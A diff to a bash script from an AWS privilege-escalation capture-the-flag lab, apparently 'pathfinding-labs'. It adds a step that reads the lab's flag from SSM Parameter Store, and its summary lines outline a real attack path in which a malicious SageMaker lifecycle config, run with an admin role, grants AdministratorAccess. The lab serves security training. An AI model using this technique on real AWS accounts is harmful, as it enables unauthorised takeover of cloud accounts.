@@ -454,12 +454,25 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 12: Capture the CTF flag
+echo -e "${YELLOW}Step 12: Capturing the CTF flag${NC}"
+use_starting_creds
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-005-to-admin --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-005-to-admin --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -z "$FLAG_VALUE" ]; then
+    echo -e "${RED}Error: Could not retrieve CTF flag — admin access may not have propagated yet${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✓ CTF flag captured: $FLAG_VALUE${NC}\n"
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited SageMaker permissions)"
@@ -470,11 +483,13 @@ echo "5. Updated notebook to use malicious lifecycle config"
 echo "6. Started notebook - lifecycle script executed with admin role"
 echo "7. Lifecycle script attached AdministratorAccess policy to starting user"
 echo "8. Achieved: Full administrator access"
+echo "9. Flag: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → StopNotebookInstance → CreateLifecycleConfig"
 echo "  → UpdateNotebookInstance → StartNotebookInstance"
 echo "  → Lifecycle Script (executes with admin role) → Admin Access"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
